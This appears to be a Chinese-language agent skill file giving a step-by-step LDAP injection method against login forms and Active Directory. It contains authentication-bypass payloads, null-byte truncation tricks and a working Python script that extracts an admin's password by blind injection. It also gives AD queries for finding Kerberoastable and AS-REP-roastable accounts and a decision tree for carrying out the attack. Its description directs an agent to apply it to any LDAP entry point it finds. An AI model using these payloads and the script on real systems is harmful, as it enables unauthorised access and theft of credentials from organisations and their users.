---
name: ldap-injection
description: "LDAP 注入检测与利用。当目标有 LDAP 认证入口（企业登录/SSO/统一认证）、发现 389/636/3268/3269 端口、URL 参数中出现 uid/cn/ou/dc 等 LDAP 属性名、或后端使用 LDAP 进行用户查询时使用。LDAP 注入与 SQL 注入思路类似但语法不同——通过注入 LDAP 搜索过滤器操作符来绕过认证或提取数据。在域环境和企业内网中常见，与 AD 域攻击配合可以获取域用户凭据。发现任何 LDAP 相关入口、Active Directory 集成认证、或 LDAP 查询参数时都应使用此 skill"
metadata:
  tags: "ldap,injection,LDAP注入,认证绕过,搜索过滤器,active directory,389,636,blind ldap,域环境"
  category: "exploit"
---

# LDAP 注入方法论

LDAP（轻量目录访问协议）广泛用于企业用户认证和目录查询。当应用将用户输入直接拼接到 LDAP 搜索过滤器中时，攻击者可以修改查询逻辑来绕过认证或提取目录数据。

## Phase 0: 识别 LDAP 后端

| 信号 | 含义 |
|------|------|
| 登录表单中有"域\用户名"或"user@domain.com"格式 | 可能是 LDAP/AD 认证 |
| 端口 389(LDAP)/636(LDAPS)/3268(Global Catalog) 开放 | 确认 LDAP 服务 |
| 错误信息含 `LDAP`、`javax.naming`、`ldap_bind` | 确认 LDAP 后端 |
| URL 参数中有 `uid`、`cn`、`ou`、`dc`、`sAMAccountName` | LDAP 属性名 |
| 使用 Active Directory 集成认证的 Web 应用 | LDAP 查询 |

## LDAP 过滤器语法速查

LDAP 使用前缀表达式（波兰记法）：

```
# 基础
(uid=john)                    # uid 等于 john
(cn=John Smith)               # cn 等于 John Smith

# 通配符
(uid=j*)                      # uid 以 j 开头
(uid=*john*)                  # uid 包含 john

# 逻辑操作
(&(uid=john)(password=pass))  # AND
(|(uid=john)(uid=admin))      # OR
(!(uid=guest))                # NOT

# 组合
(&(objectClass=user)(|(uid=john)(uid=admin)))
```

## Phase 1: 认证绕过

### 1.1 基础注入

假设后端查询为：`(&(uid=INPUT_USER)(userPassword=INPUT_PASS))`

```
# 注入用户名字段
用户名: *)(uid=*))(|(uid=*
密码: anything
→ 查询变为: (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
→ 第一个过滤器 (uid=*) 匹配所有用户

# 或更简单：
用户名: *
密码: *
→ (&(uid=*)(userPassword=*)) → 匹配所有有密码的用户

# 闭合括号绕过
用户名: admin)(&)
密码: anything
→ (&(uid=admin)(&))(userPassword=anything)
→ (&) 是 LDAP 的 TRUE，永远为真

# 注释截断（某些实现支持）
用户名: admin)%00
密码: anything
→ (&(uid=admin)\x00)(userPassword=anything)
→ NULL 字节截断后面的密码检查
```

### 1.2 通配符认证绕过

```
# 如果只知道用户名前缀
用户名: adm*
密码: *
→ (&(uid=adm*)(userPassword=*)) → 匹配 admin/administrator 等

# 枚举有效用户名
用户名: a* → 有响应？用户名以 a 开头
用户名: ad* → 有响应？用户名以 ad 开头
用户名: adm* → 有响应？...
```

### 1.3 OR 注入

```
# 注入 OR 条件
用户名: admin)(|(password=*
密码: anything
→ (&(uid=admin)(|(password=*)(userPassword=anything)))
→ OR 条件使密码检查无效

# 另一种 OR 绕过
用户名: *)(|(objectClass=*
密码: test)
→ (&(uid=*)(|(objectClass=*)(userPassword=test)))
```

## Phase 2: 数据提取（盲注）

### 2.1 属性值盲注

通过通配符逐字符猜测属性值：

```
# 猜测 admin 的密码
(&(uid=admin)(userPassword=a*))  → 响应不同？密码以 a 开头
(&(uid=admin)(userPassword=ab*)) → 继续...
(&(uid=admin)(userPassword=abc*))

# 猜测 description 字段（可能含敏感信息）
(&(uid=admin)(description=flag*))
(&(uid=admin)(description=flag{*))
```

### 2.2 属性存在性探测

```
# 探测用户有哪些属性
(&(uid=admin)(telephoneNumber=*))  → 有电话号码？
(&(uid=admin)(mail=*))             → 有邮箱？
(&(uid=admin)(userPassword=*))     → 有密码？
(&(uid=admin)(sshPublicKey=*))     → 有 SSH 公钥？

# AD 环境特有属性
(&(sAMAccountName=admin)(adminCount=1))      → 是管理员？
(&(sAMAccountName=admin)(memberOf=*admin*))  → 在管理组中？
```

### 2.3 自动化盲注脚本

```python
#!/usr/bin/env python3
"""LDAP 盲注数据提取"""
import requests
import string

URL = "http://TARGET/login"
CHARSET = string.ascii_lowercase + string.digits + "_{}-@."
ATTR = "userPassword"

def check(username_payload):
    """发送 LDAP 注入请求"""
    data = {
        "username": username_payload,
        "password": "anything"
    }
    r = requests.post(URL, data=data)
    # 根据响应差异判断（长度/内容/状态码/重定向）
    return "Welcome" in r.text or r.status_code == 302

def extract(target_user, attribute):
    """逐字符提取属性值"""
    result = ""
    while True:
        found = False
        for c in CHARSET:
            # 注入: admin)(ATTR=result+c*
            payload = f"{target_user})({attribute}={result}{c}*"
            if check(payload):
                result += c
                print(f"[+] {attribute}: {result}")
                found = True
                break
        if not found:
            break
    return result

if __name__ == "__main__":
    pwd = extract("admin", "userPassword")
    print(f"[+] Extracted: {pwd}")
```

## Phase 3: 目录遍历

如果注入点在搜索查询（非认证）中：

```
# 提取所有用户
(&(objectClass=user)(uid=*))

# 提取管理员
(&(objectClass=user)(adminCount=1))

# 提取服务账户
(&(objectClass=user)(servicePrincipalName=*))

# 提取计算机
(&(objectClass=computer)(cn=*))

# 搜索特定组的成员
(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local))
```

## Phase 4: 特殊技巧

### 4.1 NULL 字节截断

```
# 某些 LDAP 实现（如 OpenLDAP 旧版）支持 NULL 字节截断
admin)%00
→ 截断后面的密码过滤器
```

### 4.2 特殊字符转义绕过

LDAP 需要转义的字符：`* ( ) \ NUL`

```
# 如果应用转义了 *，尝试：
\2a  →  * 的十六进制转义
\28  →  ( 的十六进制转义
\29  →  ) 的十六进制转义
```

### 4.3 LDAP 与 AD 结合

如果 LDAP 后端是 Active Directory：
```
# 获取域管列表
(&(objectCategory=person)(adminCount=1))

# 获取 Kerberoastable 账户
(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))

# 获取 AS-REP Roastable 账户  
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# 获取密码永不过期账户
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))
```

## 决策树

```
发现 LDAP 认证入口
├── 尝试 */* → 认证绕过？
├── 尝试 admin)(&)/ → 闭合+TRUE 绕过？
├── 尝试 admin)%00/ → NULL 截断？
├── 以上都失败
│   ├── 检查错误信息 → 确认是否 LDAP
│   ├── 检查通配符 a*/b*/c* → 用户名枚举
│   └── 非 LDAP → 尝试 SQL 注入
└── 认证成功或有注入点
    ├── 盲注提取密码/属性
    ├── 遍历目录（用户/组/计算机）
    └── AD 环境 → Kerberoast/AS-REP 目标发现
```

## 深入参考

- LDAP 注入 payload 与盲注技术 → [references/ldap-exploitation.md](references/ldap-exploitation.md)
